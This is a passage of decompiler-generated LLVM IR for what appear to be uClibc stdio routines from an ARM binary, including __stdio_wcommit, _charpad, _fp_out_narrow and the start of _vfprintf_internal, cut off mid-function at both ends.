  store i32 44, i32* %r8.global-to-local, align 4
  %v1_133cc = inttoptr i32 %v4_133c4 to i32*
  %v2_133cc = load i32, i32* %v1_133cc, align 4
  store i32 %v2_133cc, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_134185 = add i32 %v2_133cc, 56
  store i32 %v1_134185, i32* @r5, align 4
  %v2_1341c7 = icmp eq i32 %v2_133cc, 0
  store i32 %v1_134185, i32* %r0.global-to-local, align 4
  br i1 %v2_1341c7, label %dec_label_pc_13428, label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %entry, %dec_label_pc_1340c.dec_label_pc_133d8_crit_edge
  %v1_133d8 = phi i32 [ %v1_133d8.pre, %dec_label_pc_1340c.dec_label_pc_133d8_crit_edge ], [ 44, %entry ]
  %v0_133d8 = phi i32 [ %v0_1342c.pre, %dec_label_pc_1340c.dec_label_pc_133d8_crit_edge ], [ %v0_133c4, %entry ]
  %v2_133d8 = add i32 %v0_133d8, %v1_133d8
  %v3_133d8 = inttoptr i32 %v2_133d8 to i32*
  %v4_133d8 = load i32, i32* %v3_133d8, align 4
  store i32 %v4_133d8, i32* @ip, align 4
  store i32 78820, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_133d8)
  %v0_133e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_133e4 = icmp eq i32 %v0_133e4, 0
  %v0_133e8 = load i32, i32* @r5, align 4
  store i32 %v0_133e8, i32* @r0, align 4
  br i1 %v2_133e4, label %dec_label_pc_1340c, label %dec_label_pc_133f0

dec_label_pc_133f0:                               ; preds = %dec_label_pc_133d8
  %v0_133f0 = load i32, i32* @r4, align 4
  %v1_133f0 = add i32 %v0_133f0, 8
  %v2_133f0 = inttoptr i32 %v1_133f0 to i32*
  %v3_133f0 = load i32, i32* %v2_133f0, align 4
  store i32 %v3_133f0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_133f8 = add i32 %v0_133f0, 20
  %v3_133f8 = inttoptr i32 %v2_133f8 to i32*
  store i32 %v3_133f0, i32* %v3_133f8, align 4
  %v0_133fc = load i32, i32* %r2.global-to-local, align 4
  %v1_133fc = trunc i32 %v0_133fc to i16
  %v2_133fc = load i32, i32* @r4, align 4
  %v3_133fc = inttoptr i32 %v2_133fc to i16*
  store i16 %v1_133fc, i16* %v3_133fc, align 2
  %v0_13400 = load i32, i32* %r3.global-to-local, align 4
  %v1_13400 = load i32, i32* @r4, align 4
  %v2_13400 = add i32 %v1_13400, 24
  %v3_13400 = inttoptr i32 %v2_13400 to i32*
  store i32 %v0_13400, i32* %v3_13400, align 4
  %v0_13404 = load i32, i32* %r3.global-to-local, align 4
  %v1_13404 = load i32, i32* @r4, align 4
  %v2_13404 = add i32 %v1_13404, 28
  %v3_13404 = inttoptr i32 %v2_13404 to i32*
  store i32 %v0_13404, i32* %v3_13404, align 4
  %v0_13408 = load i32, i32* %r3.global-to-local, align 4
  %v1_13408 = load i32, i32* @r4, align 4
  %v2_13408 = add i32 %v1_13408, 16
  %v3_13408 = inttoptr i32 %v2_13408 to i32*
  store i32 %v0_13408, i32* %v3_13408, align 4
  br label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133d8, %dec_label_pc_133f0
  %v0_1340c = load i32, i32* %r7.global-to-local, align 4
  %v1_1340c = load i32, i32* @r4, align 4
  %v2_1340c = add i32 %v1_1340c, 52
  %v3_1340c = inttoptr i32 %v2_1340c to i32*
  store i32 %v0_1340c, i32* %v3_1340c, align 4
  %v1_13410 = call i32 @__stdio_init_mutex(i32 %v0_133e8)
  store i32 %v1_13410, i32* %r0.global-to-local, align 4
  %v0_13414 = load i32, i32* @r4, align 4
  %v1_13414 = add i32 %v0_13414, 32
  %v2_13414 = inttoptr i32 %v1_13414 to i32*
  %v3_13414 = load i32, i32* %v2_13414, align 4
  store i32 %v3_13414, i32* @r4, align 4
  %v1_13418 = add i32 %v3_13414, 56
  store i32 %v1_13418, i32* @r5, align 4
  %v2_1341c = icmp eq i32 %v3_13414, 0
  store i32 %v1_13418, i32* %r0.global-to-local, align 4
  %v0_1342c.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_1341c, label %dec_label_pc_13428, label %dec_label_pc_1340c.dec_label_pc_133d8_crit_edge

dec_label_pc_1340c.dec_label_pc_133d8_crit_edge:  ; preds = %dec_label_pc_1340c
  %v1_133d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_133d8

dec_label_pc_13428:                               ; preds = %dec_label_pc_1340c, %entry
  %v1_1345814 = phi i32 [ %v1_134185, %entry ], [ %v1_13418, %dec_label_pc_1340c ]
  %v0_1342c = phi i32 [ %v0_133c4, %entry ], [ %v0_1342c.pre, %dec_label_pc_1340c ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_1342c = add i32 %v0_1342c, 48
  %v3_1342c = inttoptr i32 %v2_1342c to i32*
  %v4_1342c = load i32, i32* %v3_1342c, align 4
  store i32 %v4_1342c, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_1342c to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_1344c4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1344c4, label %dec_label_pc_13454, label %dec_label_pc_13438

dec_label_pc_13438:                               ; preds = %dec_label_pc_13428, %dec_label_pc_1344c
  %v1_13440 = phi i32 [ %storemerge, %dec_label_pc_1344c ], [ %storemerge2, %dec_label_pc_13428 ]
  %v1_13438 = inttoptr i32 %v1_13440 to i16*
  %v2_13438 = load i16, i16* %v1_13438, align 2
  %v3_13438 = zext i16 %v2_13438 to i32
  store i32 %v3_13438, i32* %r3.global-to-local, align 4
  %v1_1343c = and i32 %v3_13438, 64
  %v2_1343c = icmp eq i32 %v1_1343c, 0
  br i1 %v2_1343c, label %dec_label_pc_1344c, label %bb

bb:                                               ; preds = %dec_label_pc_13438
  store i32 %v1_13440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1344c

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13438, %bb
  %v1_13444 = xor i1 %v2_1343c, true
  call void @__pseudo_cond_branch(i1 %v1_13444, i32 ptrtoint (i32* @global_var_13470.854 to i32))
  %v0_13448 = load i32, i32* %r4.global-to-local, align 4
  %v1_13448 = add i32 %v0_13448, 32
  %storemerge.in = inttoptr i32 %v1_13448 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_1344c = icmp eq i32 %storemerge, 0
  br i1 %v2_1344c, label %dec_label_pc_1344c.dec_label_pc_13454_crit_edge, label %dec_label_pc_13438

dec_label_pc_1344c.dec_label_pc_13454_crit_edge:  ; preds = %dec_label_pc_1344c
  %v1_13458.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_1344c.dec_label_pc_13454_crit_edge, %dec_label_pc_13428
  %v1_13458 = phi i32 [ %v1_13458.pre, %dec_label_pc_1344c.dec_label_pc_13454_crit_edge ], [ %v1_1345814, %dec_label_pc_13428 ]
  %v2_13454 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13454, i32* %r4.global-to-local, align 4
  ret i32 %v1_13458

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_133c4, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 0, 1, 2, 6, 7, 3, 4 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1344c, { 1, 0 }
  uselistorder label %dec_label_pc_13438, { 1, 0 }
  uselistorder label %dec_label_pc_1340c, { 1, 0 }
  uselistorder label %dec_label_pc_133d8, { 1, 0 }
}

define i32 @function_13460(i32 %arg1) local_unnamed_addr {
dec_label_pc_13460:
  %v0_13460 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13460, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13460
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13460, %bb
  %v4_1346c = phi i32 [ %arg1, %dec_label_pc_13460 ], [ 0, %bb ]
  ret i32 %v4_1346c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13470 = load i32, i32* @r4, align 4
  store i32 %v3_13470, i32* %stack_var_-8, align 4
  %v0_13474 = load i32, i32* @r0, align 4
  %v1_13474 = add i32 %v0_13474, 8
  %v2_13474 = inttoptr i32 %v1_13474 to i32*
  %v3_13474 = load i32, i32* %v2_13474, align 4
  %v1_13478 = add i32 %v0_13474, 16
  %v2_13478 = inttoptr i32 %v1_13478 to i32*
  %v3_13478 = load i32, i32* %v2_13478, align 4
  %v9_1347c = icmp eq i32 %v3_13478, %v3_13474
  store i32 %v0_13474, i32* %r4.global-to-local, align 4
  br i1 %v9_1347c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_13474, i32* %v2_13478, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_13488 = xor i1 %v9_1347c, true
  call void @__pseudo_cond_branch(i1 %v1_13488, i32 ptrtoint (i32* @global_var_19000.855 to i32))
  %v0_1348c = load i32, i32* %r4.global-to-local, align 4
  %v1_1348c = add i32 %v0_1348c, 8
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  %v1_13490 = add i32 %v0_1348c, 16
  %v2_13490 = inttoptr i32 %v1_13490 to i32*
  %v3_13490 = load i32, i32* %v2_13490, align 4
  %v2_13494 = sub i32 %v3_13490, %v3_1348c
  %v2_13498 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13498, i32* @r4, align 4
  ret i32 %v2_13494

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_134a0 = load i32, i32* @r4, align 4
  %v6_134a0 = load i32, i32* @r5, align 4
  %v9_134a0 = load i32, i32* @r6, align 4
  %v12_134a0 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_134ac = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_134ac, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_134c42 = icmp eq i32 %arg3, 0
  br i1 %v2_134c42, label %dec_label_pc_134e4, label %dec_label_pc_134d8

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134d8
  %v1_134c0 = add i32 %v0_134c0, -1
  store i32 %v1_134c0, i32* @r4, align 4
  %v2_134c4 = icmp eq i32 %v1_134c0, 0
  %v0_134d0 = load i32, i32* @r7, align 4
  br i1 %v2_134c4, label %dec_label_pc_134e4.loopexit, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %entry, %dec_label_pc_134c0
  %v0_134d04 = phi i32 [ %v0_134d0, %dec_label_pc_134c0 ], [ %arg1, %entry ]
  %v3_134d8 = inttoptr i32 %v0_134d04 to i16*
  %v4_134d8 = call i32 @__stdio_fwrite(i32 %v10_134ac, i32 1, i16* %v3_134d8)
  %v7_134dc = icmp eq i32 %v4_134d8, 1
  %v0_134c0 = load i32, i32* @r4, align 4
  br i1 %v7_134dc, label %dec_label_pc_134c0, label %dec_label_pc_134e4.loopexit

dec_label_pc_134e4.loopexit:                      ; preds = %dec_label_pc_134c0, %dec_label_pc_134d8
  %v0_134e4.ph = phi i32 [ %v0_134c0, %dec_label_pc_134d8 ], [ 0, %dec_label_pc_134c0 ]
  %v1_134e4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134e4.loopexit, %entry
  %v1_134e4 = phi i32 [ 0, %entry ], [ %v1_134e4.pre, %dec_label_pc_134e4.loopexit ]
  %v0_134e4 = phi i32 [ 0, %entry ], [ %v0_134e4.ph, %dec_label_pc_134e4.loopexit ]
  %v2_134e4 = sub i32 %v1_134e4, %v0_134e4
  store i32 %v3_134a0, i32* @r4, align 4
  store i32 %v6_134a0, i32* @r5, align 4
  store i32 %v9_134a0, i32* @r6, align 4
  store i32 %v12_134a0, i32* @r7, align 4
  ret i32 %v2_134e4

; uselistorder directives
  uselistorder i32 %v1_134c0, { 1, 0 }
  uselistorder label %dec_label_pc_134e4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_134d8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_134f4 = load i32, i32* @r4, align 4
  store i32 %v3_134f4, i32* %stack_var_-24, align 4
  %v6_134f4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_134fc = and i32 %arg2, 128
  %v2_134fc = icmp eq i32 %v1_134fc, 0
  %v0_13500 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13500, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_134fc, label %dec_label_pc_13550thread-pre-split, label %dec_label_pc_13514

dec_label_pc_13514:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13518 = call i32 @strlen(i8* %arg4)
  store i32 %v3_13518, i32* %r0.global-to-local, align 4
  %v1_1351c = load i32, i32* %r4.global-to-local, align 4
  %v2_1351c = sub i32 %v1_1351c, %v3_13518
  store i32 %v2_1351c, i32* @r4, align 4
  store i32 %v3_13518, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_1351c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_13530

.thread:                                          ; preds = %dec_label_pc_13514
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1354c

dec_label_pc_13530:                               ; preds = %dec_label_pc_13514
  %v0_13530 = load i32, i32* @r5, align 4
  %v1_13530 = urem i32 %v0_13530, 128
  %v0_13534 = load i32, i32* @r8, align 4
  store i32 %v0_13534, i32* %r0.global-to-local, align 4
  %v3_1353c = trunc i32 %v1_13530 to i8
  %v4_1353c = call i32 @_charpad(i32 %v0_13534, i8 %v3_1353c, i32 %v2_1351c)
  store i32 %v4_1353c, i32* %r0.global-to-local, align 4
  %v1_13540 = load i32, i32* @r4, align 4
  %v9_13540 = icmp eq i32 %v4_1353c, %v1_13540
  store i32 %v4_1353c, i32* %r5.global-to-local, align 4
  br i1 %v9_13540, label %dec_label_pc_13530.dec_label_pc_1354c_crit_edge, label %dec_label_pc_1356c

dec_label_pc_13530.dec_label_pc_1354c_crit_edge:  ; preds = %dec_label_pc_13530
  %v0_1354c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1354c

dec_label_pc_1354c:                               ; preds = %.thread, %dec_label_pc_13530.dec_label_pc_1354c_crit_edge
  %v0_1354c = phi i32 [ %v0_1354c.pre, %dec_label_pc_13530.dec_label_pc_1354c_crit_edge ], [ %v3_13518, %.thread ]
  store i32 %v0_1354c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13550

dec_label_pc_13550thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13550

dec_label_pc_13550:                               ; preds = %dec_label_pc_13550thread-pre-split, %dec_label_pc_1354c
  %v5_1355c = phi i32 [ %arg3, %dec_label_pc_13550thread-pre-split ], [ %v0_1354c, %dec_label_pc_1354c ]
  %tmp14 = icmp slt i32 %v5_1355c, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_13550
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13550
  %v5_13558 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_13558, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_190b4.856 to i32))
  %v0_13568 = load i32, i32* %r5.global-to-local, align 4
  %v2_13568 = add i32 %storemerge, %v0_13568
  store i32 %v2_13568, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13530, %bb15
  %v0_1356c = phi i32 [ %v4_1353c, %dec_label_pc_13530 ], [ %v2_13568, %bb15 ]
  store i32 %v0_1356c, i32* %r0.global-to-local, align 4
  %v2_13570 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13570, i32* %r4.global-to-local, align 4
  store i32 %v6_134f4, i32* %r5.global-to-local, align 4
  ret i32 %v0_1356c

; uselistorder directives
  uselistorder i32 %v0_1356c, { 1, 0 }
  uselistorder i32 %v0_1354c, { 1, 0 }
  uselistorder i32 %v2_1351c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_1354c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_13578 = load i32, i32* @r5, align 4
  %v12_13578 = load i32, i32* @r7, align 4
  %v18_13578 = load i32, i32* @sb, align 4
  %v21_13578 = load i32, i32* @sl, align 4
  %v24_13578 = load i32, i32* @fp, align 4
  %v2_13580 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_13580, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_13580, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13590 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13590, i32* @r5, align 4
  %v2_13594 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_13594, i32* %r0.global-to-local, align 4
  %v1_1359c = icmp slt i32 %v2_13594, 0
  br i1 %v1_1359c, label %dec_label_pc_135ac, label %dec_label_pc_135e0

dec_label_pc_135ac:                               ; preds = %entry
  %v3_135ac = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_135ac, i32* @r4, align 4
  %v1_135b0 = inttoptr i32 %v3_135ac to i8*
  store i32 %v3_135ac, i32* %r0.global-to-local, align 4
  %v3_135b4 = call i32 @strlen(i8* %v1_135b0)
  store i32 %v3_135b4, i32* %r0.global-to-local, align 4
  %v2_135b8 = icmp eq i32 %v3_135b4, 0
  br i1 %v2_135b8, label %bb, label %dec_label_pc_135c8

bb:                                               ; preds = %dec_label_pc_135ac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c30

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135ac
  %v0_135c8 = load i32, i32* @r4, align 4
  store i32 %v0_135c8, i32* %r0.global-to-local, align 4
  %v0_135cc = load i32, i32* @fp, align 4
  store i32 %v0_135cc, i32* %r2.global-to-local, align 4
  %v3_135d0 = inttoptr i32 %v0_135cc to i16*
  %v4_135d0 = call i32 @__stdio_fwrite(i32 %v0_135c8, i32 %v3_135b4, i16* %v3_135d0)
  store i32 %v4_135d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c30

dec_label_pc_135e0:                               ; preds = %entry
  %v0_135e0 = load i32, i32* @r5, align 4
  store i32 %v2_13580, i32* %r0.global-to-local, align 4
  %v2_135e8 = call i32 @_ppfs_prepargs(i32 %v2_13580, i32 %v0_135e0)
  store i32 %v2_135e8, i32* %r0.global-to-local, align 4
  store i32 1012, i32* @ip, align 4
  %v0_13630 = load i32, i32* @r4, align 4
  store i32 %v0_13630, i32* %r2.global-to-local, align 4
  %v1_136b4 = bitcast i32* %stack_var_-352 to i8*
  %v4_136c4 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_136d0 = ptrtoint i32* %stack_var_-272 to i32
  %v2_136e8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_13704 = icmp eq i32 %tmp104, 0
  %v2_13a3c = ptrtoint i32* %stack_var_-200 to i32
  %v2_13a80 = ptrtoint i32* %stack_var_-348 to i32
  %v2_13a84 = ptrtoint i32* %stack_var_-72 to i32
  %v2_13938 = ptrtoint i32* %stack_var_-44 to i32
  %v2_13944 = ptrtoint i32* %stack_var_-52 to i32
  %v7_137a0 = zext i8 %tmp102 to i32
  %v2_137d8 = ptrtoint i32* %stack_var_-73 to i32
  %v1_137e0 = bitcast i32* %stack_var_-73 to i8*
  %v2_137e8 = icmp ugt i32 %tmp104, 4
  %v7_137e8 = icmp eq i32 %tmp104, 5
  %v7_136cc = ptrtoint i32* %stack_var_-280 to i32
  %v5_136fc195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_1390c = icmp ugt i32 %tmp104, 16
  %v7_1390c = icmp eq i32 %tmp104, 17
  %v2_13910 = xor i1 %v7_1390c, true
  %v3_13910 = and i1 %v2_1390c, %v2_13910
  %v2_13994 = icmp ugt i32 %tmp104, 18
  %v7_13994 = icmp eq i32 %tmp104, 19
  %v2_13998 = xor i1 %v7_13994, true
  %v3_13998 = and i1 %v2_13994, %v2_13998
  %v7_13a30 = icmp eq i32 %tmp104, 20
  %v1_13748 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -37049)
  %v2_13748 = inttoptr i32 %v1_13748 to i8*
  %v2_13774 = xor i1 %v7_137e8, true
  %v3_13774 = and i1 %v2_137e8, %v2_13774
  %v7_137a8 = icmp eq i32 %tmp104, 1
  %v2_137f0 = xor i1 %v2_137e8, true
  %v3_137f0 = or i1 %v7_137e8, %v2_137f0
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_13858 = icmp eq i32 %tmp104, 3
  %v11_13864 = icmp eq i32 %tmp104, 4
  %v9_136d4 = mul nuw nsw i32 %v4_136c4, 8
  %v10_136d4 = add i32 %v7_136cc, %v9_136d4
  br label %dec_label_pc_13634.outer

dec_label_pc_13634.outer:                         ; preds = %dec_label_pc_13c14, %dec_label_pc_135e0
  %v0_1363445 = phi i32 [ %v3_13c14, %dec_label_pc_13c14 ], [ %v0_13630, %dec_label_pc_135e0 ]
  %v0_13768 = phi i32 [ %stack_var_-336.4, %dec_label_pc_13c14 ], [ %tmp103, %dec_label_pc_135e0 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_13c14 ], [ 0, %dec_label_pc_135e0 ]
  br label %dec_label_pc_13634.outer36

dec_label_pc_13634.outer36:                       ; preds = %dec_label_pc_13634.outer, %dec_label_pc_13c20
  %v0_1363444 = phi i32 [ %v0_1363445, %dec_label_pc_13634.outer ], [ %v1_13c20, %dec_label_pc_13c20 ]
  %v5_13660 = phi i32 [ %v0_1363445, %dec_label_pc_13634.outer ], [ %v1_13690, %dec_label_pc_13c20 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_13634.outer ], [ %v1_13b00, %dec_label_pc_13c20 ]
  %v1_13634188 = inttoptr i32 %v0_1363444 to i8*
  %v2_13634189 = load i8, i8* %v1_13634188, align 1
  %v2_13638191 = icmp eq i8 %v2_13634189, 0
  br i1 %v2_13638191, label %dec_label_pc_13650, label %bb138

bb138:                                            ; preds = %dec_label_pc_13634.outer36, %.thread6
  %v2_13634193 = phi i8 [ %v2_13634, %.thread6 ], [ %v2_13634189, %dec_label_pc_13634.outer36 ]
  %v1_13648192 = phi i32 [ %v2_13648, %.thread6 ], [ %v0_1363444, %dec_label_pc_13634.outer36 ]
  %v8_1363c = icmp eq i8 %v2_13634193, 37
  br i1 %v8_1363c, label %dec_label_pc_13650, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_13648 = add i32 %v1_13648192, 1
  store i32 %v2_13648, i32* @r4, align 4
  %v1_13634 = inttoptr i32 %v2_13648 to i8*
  %v2_13634 = load i8, i8* %v1_13634, align 1
  %v2_13638 = icmp eq i8 %v2_13634, 0
  br i1 %v2_13638, label %dec_label_pc_13650, label %bb138

dec_label_pc_13650:                               ; preds = %bb138, %.thread6, %dec_label_pc_13634.outer36
  %v1_13648.lcssa = phi i32 [ %v0_1363444, %dec_label_pc_13634.outer36 ], [ %v2_13648, %.thread6 ], [ %v1_13648192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13650 = sub i32 %v1_13648.lcssa, %v5_13660
  %v9_13650 = icmp eq i32 %v1_13648.lcssa, %v5_13660
  br i1 %v9_13650, label %dec_label_pc_13684, label %dec_label_pc_13658

dec_label_pc_13658:                               ; preds = %dec_label_pc_13650
  store i32 %v2_13650, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_13650, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_13658
  store i32 %v5_13660, i32* %r0.global-to-local, align 4
  %v5_13668 = load i32, i32* @fp, align 4
  store i32 %v5_13668, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_13658, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_13658 ]
  store i32 79472, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_190b4.856 to i32))
  %v0_13670 = load i32, i32* %r0.global-to-local, align 4
  %v1_13670 = load i32, i32* @r5, align 4
  %v9_13670 = icmp eq i32 %v0_13670, %v1_13670
  br i1 %v9_13670, label %dec_label_pc_13678, label %dec_label_pc_13c28

dec_label_pc_13678:                               ; preds = %bb142
  %v2_1367c = add i32 %v0_13670, %stack_var_-356.1.ph37
  store i32 %v2_1367c, i32* @ip, align 4
  %v0_13684.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13684

dec_label_pc_13684:                               ; preds = %dec_label_pc_13650, %dec_label_pc_13678
  %v0_13698 = phi i32 [ %v5_13660, %dec_label_pc_13650 ], [ %v0_13684.pre, %dec_label_pc_13678 ]
  %v1_13b00 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_13650 ], [ %v2_1367c, %dec_label_pc_13678 ]
  %v1_13684 = inttoptr i32 %v0_13698 to i8*
  %v2_13684 = load i8, i8* %v1_13684, align 1
  %v2_13688 = icmp eq i8 %v2_13684, 0
  br i1 %v2_13688, label %dec_label_pc_13c30, label %dec_label_pc_13690

dec_label_pc_13690:                               ; preds = %dec_label_pc_13684
  %v1_13690 = add i32 %v0_13698, 1
  %v2_13690 = inttoptr i32 %v1_13690 to i8*
  %v3_13690 = load i8, i8* %v2_13690, align 1
  %v7_13694 = icmp eq i8 %v3_13690, 37
  store i32 %v1_13690, i32* %r2.global-to-local, align 4
  br i1 %v7_13694, label %dec_label_pc_13c20, label %dec_label_pc_136a0

dec_label_pc_136a0:                               ; preds = %dec_label_pc_13690
  store i32 %v2_13580, i32* @r4, align 4
  store i32 %v2_13580, i32* %r0.global-to-local, align 4
  store i32 %v1_13690, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_136b4 = call i32 @_ppfs_parsespec(i8* %v1_136b4)
  store i32 %v2_13580, i32* @r0, align 4
  %v0_136bc = call i32 @_ppfs_setargs()
  store i32 %v0_136bc, i32* %r0.global-to-local, align 4
